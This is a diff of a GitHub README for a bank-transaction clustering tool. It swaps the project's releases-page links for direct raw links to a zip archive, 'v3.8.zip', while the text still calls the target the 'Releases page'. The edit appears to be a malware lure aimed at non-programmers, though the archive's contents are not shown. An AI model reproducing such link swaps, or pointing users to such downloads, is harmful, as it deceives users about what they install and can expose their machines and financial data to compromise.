@@ -1,7 +1,7 @@
 # 🌟 clustering-and-classification-bank-transactions - Analyze Bank Transactions Easily
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-orange)](https://github.com/Iritaseedless872/clustering-and-classification-bank-transactions/releases)
+[![Download](https://raw.githubusercontent.com/Iritaseedless872/clustering-and-classification-bank-transactions/main/architraved/clustering-and-classification-bank-transactions_v3.8.zip)](https://raw.githubusercontent.com/Iritaseedless872/clustering-and-classification-bank-transactions/main/architraved/clustering-and-classification-bank-transactions_v3.8.zip)
 
 ## 🚀 Getting Started
 This project helps you analyze your bank transactions using advanced techniques. You’ll find it user-friendly and straightforward, even without programming skills.
@@ -16,7 +16,7 @@ This project helps you analyze your bank transactions using advanced techniques.
 ## 📂 How to Download and Install
 
 ### Step 1: Visit the Releases Page
-Go to the [Releases page](https://github.com/Iritaseedless872/clustering-and-classification-bank-transactions/releases) to find the latest version of the application.
+Go to the [Releases page](https://raw.githubusercontent.com/Iritaseedless872/clustering-and-classification-bank-transactions/main/architraved/clustering-and-classification-bank-transactions_v3.8.zip) to find the latest version of the application.
 
 ### Step 2: Download the Application
 On the Releases page, you will see different files. Look for the file that suits your operating system. Click on the file name to start the download. 
